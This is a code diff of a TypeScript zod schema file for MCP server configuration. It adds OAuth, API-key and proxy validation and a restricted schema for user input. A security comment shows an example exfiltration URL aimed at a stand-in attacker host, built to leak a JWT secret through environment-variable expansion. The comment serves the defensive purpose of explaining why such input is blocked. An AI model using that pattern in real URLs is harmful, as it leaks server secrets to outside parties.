@@ -2,7 +2,63 @@ import { z } from 'zod';
 import { TokenExchangeMethodEnum } from './types/agents';
 import { extractEnvVariable } from './utils';
 
+const OAuthOptionsSchema = z
+  .object({
+    /** OAuth authorization endpoint (optional - can be auto-discovered) */
+    authorization_url: z.string().url().optional(),
+    /** OAuth token endpoint (optional - can be auto-discovered) */
+    token_url: z.string().url().optional(),
+    /** OAuth client ID (optional - can use dynamic registration) */
+    client_id: z.string().optional(),
+    /** OAuth client secret (requires explicit authorization and token endpoints) */
+    client_secret: z.string().optional(),
+    /** OAuth scopes to request */
+    scope: z.string().optional(),
+    /** OAuth redirect URI (defaults to /api/mcp/{serverName}/oauth/callback) */
+    redirect_uri: z.string().url().optional(),
+    /** Token exchange method */
+    token_exchange_method: z.nativeEnum(TokenExchangeMethodEnum).optional(),
+    /** Supported grant types (defaults to ['authorization_code', 'refresh_token']) */
+    grant_types_supported: z.array(z.string()).optional(),
+    /** Supported token endpoint authentication methods (defaults to ['client_secret_basic', 'client_secret_post']) */
+    token_endpoint_auth_methods_supported: z.array(z.string()).optional(),
+    /** Supported response types (defaults to ['code']) */
+    response_types_supported: z.array(z.string()).optional(),
+    /** Supported code challenge methods (defaults to ['S256', 'plain']) */
+    code_challenge_methods_supported: z.array(z.string()).optional(),
+    /** Skip code challenge validation and force S256 (useful for providers like AWS Cognito that support S256 but don't advertise it) */
+    skip_code_challenge_check: z.boolean().optional(),
+    /** OAuth revocation endpoint (optional - can be auto-discovered) */
+    revocation_endpoint: z.string().url().optional(),
+    /** OAuth revocation endpoint authentication methods supported (optional - can be auto-discovered) */
+    revocation_endpoint_auth_methods_supported: z.array(z.string()).optional(),
+  })
+  .superRefine((oauth, ctx) => {
+    if (oauth.client_secret && !oauth.client_id) {
+      ctx.addIssue({
+        code: z.ZodIssueCode.custom,
+        path: ['client_secret'],
+        message: 'OAuth client_secret requires client_id',
+      });
+    }
+
+    if (oauth.client_id && oauth.client_secret && (!oauth.authorization_url || !oauth.token_url)) {
+      ctx.addIssue({
+        code: z.ZodIssueCode.custom,
+        path: ['client_secret'],
+        message: 'OAuth client_secret with client_id requires both authorization_url and token_url',
+      });
+    }
+  });
+
 const BaseOptionsSchema = z.object({
+  /** Display name for the MCP server - only letters, numbers, and spaces allowed */
+  title: z
+    .string()
+    .regex(/^[a-zA-Z0-9 ]+$/, 'Title can only contain letters, numbers, and spaces')
+    .optional(),
+  /** Description of the MCP server */
+  description: z.string().optional(),
   /**
    * Controls whether the MCP server is initialized during application startup.
    * - true (default): Server is initialized during app startup and included in app-level connections
@@ -11,8 +67,10 @@ const BaseOptionsSchema = z.object({
    */
   startup: z.boolean().optional(),
   iconPath: z.string().optional(),
-  timeout: z.number().optional(),
-  initTimeout: z.number().optional(),
+  timeout: z.number().int().nonnegative().optional(),
+  /** Timeout (ms) for the long-lived SSE GET stream body before undici aborts it. Default: 300_000 (5 min). */
+  sseReadTimeout: z.number().int().positive().optional(),
+  initTimeout: z.number().int().nonnegative().optional(),
   /** Controls visibility in chat dropdown menu (MCPSelect) */
   chatMenu: z.boolean().optional(),
   /**
@@ -30,36 +88,26 @@ const BaseOptionsSchema = z.object({
   /**
    * OAuth configuration for SSE and Streamable HTTP transports
    * - Optional: OAuth can be auto-discovered on 401 responses
-   * - Pre-configured values will skip discovery steps
+   * - Pre-configured confidential clients must pin both OAuth endpoints
    */
-  oauth: z
+  oauth: OAuthOptionsSchema.optional(),
+  /** Custom headers to send with OAuth requests (registration, discovery, token exchange, etc.) */
+  oauth_headers: z.record(z.string(), z.string()).optional(),
+  /**
+   * API Key authentication configuration for SSE and Streamable HTTP transports
+   * - source: 'admin' means the key is provided by admin and shared by all users
+   * - source: 'user' means each user provides their own key via customUserVars
+   */
+  apiKey: z
     .object({
-      /** OAuth authorization endpoint (optional - can be auto-discovered) */
-      authorization_url: z.string().url().optional(),
-      /** OAuth token endpoint (optional - can be auto-discovered) */
-      token_url: z.string().url().optional(),
-      /** OAuth client ID (optional - can use dynamic registration) */
-      client_id: z.string().optional(),
-      /** OAuth client secret (optional - can use dynamic registration) */
-      client_secret: z.string().optional(),
-      /** OAuth scopes to request */
-      scope: z.string().optional(),
-      /** OAuth redirect URI (defaults to /api/mcp/{serverName}/oauth/callback) */
-      redirect_uri: z.string().url().optional(),
-      /** Token exchange method */
-      token_exchange_method: z.nativeEnum(TokenExchangeMethodEnum).optional(),
-      /** Supported grant types (defaults to ['authorization_code', 'refresh_token']) */
-      grant_types_supported: z.array(z.string()).optional(),
-      /** Supported token endpoint authentication methods (defaults to ['client_secret_basic', 'client_secret_post']) */
-      token_endpoint_auth_methods_supported: z.array(z.string()).optional(),
-      /** Supported response types (defaults to ['code']) */
-      response_types_supported: z.array(z.string()).optional(),
-      /** Supported code challenge methods (defaults to ['S256', 'plain']) */
-      code_challenge_methods_supported: z.array(z.string()).optional(),
-      /** OAuth revocation endpoint (optional - can be auto-discovered) */
-      revocation_endpoint: z.string().url().optional(),
-      /** OAuth revocation endpoint authentication methods supported (optional - can be auto-discovered) */
-      revocation_endpoint_auth_methods_supported: z.array(z.string()).optional(),
+      /** API key value (only for admin-provided mode, stored encrypted) */
+      key: z.string().optional(),
+      /** Whether key is provided by admin or each user */
+      source: z.enum(['admin', 'user']),
+      /** How to format the authorization header */
+      authorization_type: z.enum(['basic', 'bearer', 'custom']),
+      /** Custom header name when authorization_type is 'custom' */
+      custom_header: z.string().optional(),
     })
     .optional(),
   customUserVars: z
@@ -73,8 +121,27 @@ const BaseOptionsSchema = z.object({
     .optional(),
 });
 
+const ProxyUrlSchema = z
+  .string()
+  .transform((val: string) => extractEnvVariable(val))
+  .pipe(z.string().url())
+  .refine(
+    (val: string) => {
+      const protocol = new URL(val).protocol;
+      return (
+        protocol === 'http:' ||
+        protocol === 'https:' ||
+        protocol === 'socks:' ||
+        protocol === 'socks5:'
+      );
+    },
+    {
+      message: 'Proxy URL must use http://, https://, socks://, or socks5://',
+    },
+  );
+
 export const StdioOptionsSchema = BaseOptionsSchema.extend({
-  type: z.literal('stdio').optional(),
+  type: z.literal('stdio').default('stdio'),
   /**
    * The executable to run to start the server.
    */
@@ -104,17 +171,17 @@ export const StdioOptionsSchema = BaseOptionsSchema.extend({
       return processedEnv;
     }),
   /**
-   * How to handle stderr of the child process. This matches the semantics of Node's `child_process.spawn`.
-   *
-   * @type {import('node:child_process').IOType | import('node:stream').Stream | number}
-   *
-   * The default is "inherit", meaning messages to stderr will be printed to the parent process's stderr.
+   * How to handle stderr of the child process.
+   * Accepts: 'pipe' | 'ignore' | 'inherit' | file descriptor number.
+   * Defaults to "inherit".
    */
-  stderr: z.any().optional(),
+  stderr: z
+    .union([z.enum(['pipe', 'ignore', 'inherit']), z.number().int().nonnegative()])
+    .optional(),
 });
 
 export const WebSocketOptionsSchema = BaseOptionsSchema.extend({
-  type: z.literal('websocket').optional(),
+  type: z.literal('websocket').default('websocket'),
   url: z
     .string()
     .transform((val: string) => extractEnvVariable(val))
@@ -131,8 +198,10 @@ export const WebSocketOptionsSchema = BaseOptionsSchema.extend({
 });
 
 export const SSEOptionsSchema = BaseOptionsSchema.extend({
-  type: z.literal('sse').optional(),
+  type: z.literal('sse').default('sse'),
   headers: z.record(z.string(), z.string()).optional(),
+  /** Optional outbound proxy URL for this remote MCP transport */
+  proxy: ProxyUrlSchema.optional(),
   url: z
     .string()
     .transform((val: string) => extractEnvVariable(val))
@@ -151,6 +220,8 @@ export const SSEOptionsSchema = BaseOptionsSchema.extend({
 export const StreamableHTTPOptionsSchema = BaseOptionsSchema.extend({
   type: z.union([z.literal('streamable-http'), z.literal('http')]),
   headers: z.record(z.string(), z.string()).optional(),
+  /** Optional outbound proxy URL for this remote MCP transport */
+  proxy: ProxyUrlSchema.optional(),
   url: z
     .string()
     .transform((val: string) => extractEnvVariable(val))
@@ -176,3 +247,68 @@ export const MCPOptionsSchema = z.union([
 export const MCPServersSchema = z.record(z.string(), MCPOptionsSchema);
 
 export type MCPOptions = z.infer<typeof MCPOptionsSchema>;
+
+/**
+ * Helper to omit server-managed fields that should not come from UI
+ */
+const omitServerManagedFields = <T extends z.ZodObject<z.ZodRawShape>>(schema: T) =>
+  schema.omit({
+    startup: true,
+    timeout: true,
+    sseReadTimeout: true,
+    initTimeout: true,
+    chatMenu: true,
+    serverInstructions: true,
+    requiresOAuth: true,
+    customUserVars: true,
+    oauth_headers: true,
+  });
+
+const envVarPattern = /\$\{[^}]+\}/;
+const isWsProtocol = (val: string): boolean => /^wss?:/i.test(val);
+const isHttpProtocol = (val: string): boolean => /^https?:/i.test(val);
+
+/**
+ * Builds a URL schema for user input that rejects ${VAR} env variable patterns
+ * and validates protocol constraints without resolving environment variables.
+ */
+const userUrlSchema = (protocolCheck: (val: string) => boolean, message: string) =>
+  z
+    .string()
+    .refine((val) => !envVarPattern.test(val), {
+      message: 'Environment variable references are not allowed in URLs',
+    })
+    .pipe(z.string().url())
+    .refine(protocolCheck, { message });
+
+/**
+ * MCP Server configuration that comes from UI/API input only.
+ * Omits server-managed fields like startup, timeout, customUserVars, etc.
+ * Allows: title, description, url, iconPath, oauth (user credentials)
+ *
+ * SECURITY: Stdio transport is intentionally excluded from user input.
+ * Stdio allows arbitrary command execution and should only be configured
+ * by administrators via the YAML config file (librechat.yaml).
+ * Only remote transports (SSE, HTTP, WebSocket) are allowed via the API.
+ *
+ * SECURITY: URL fields use userUrlSchema instead of the admin schemas'
+ * extractEnvVariable transform to prevent env variable exfiltration
+ * through user-controlled URLs (e.g. http://attacker.com/?k=${JWT_SECRET}).
+ * Protocol checks use positive allowlists (http(s) / ws(s)) to block
+ * file://, ftp://, javascript:, and other non-network schemes.
+ */
+export const MCPServerUserInputSchema = z.union([
+  omitServerManagedFields(WebSocketOptionsSchema).extend({
+    url: userUrlSchema(isWsProtocol, 'WebSocket URL must use ws:// or wss://'),
+  }),
+  omitServerManagedFields(SSEOptionsSchema).extend({
+    proxy: z.never().optional(),
+    url: userUrlSchema(isHttpProtocol, 'SSE URL must use http:// or https://'),
+  }),
+  omitServerManagedFields(StreamableHTTPOptionsSchema).extend({
+    proxy: z.never().optional(),
+    url: userUrlSchema(isHttpProtocol, 'Streamable HTTP URL must use http:// or https://'),
+  }),
+]);
+
+export type MCPServerUserInput = z.infer<typeof MCPServerUserInputSchema>;
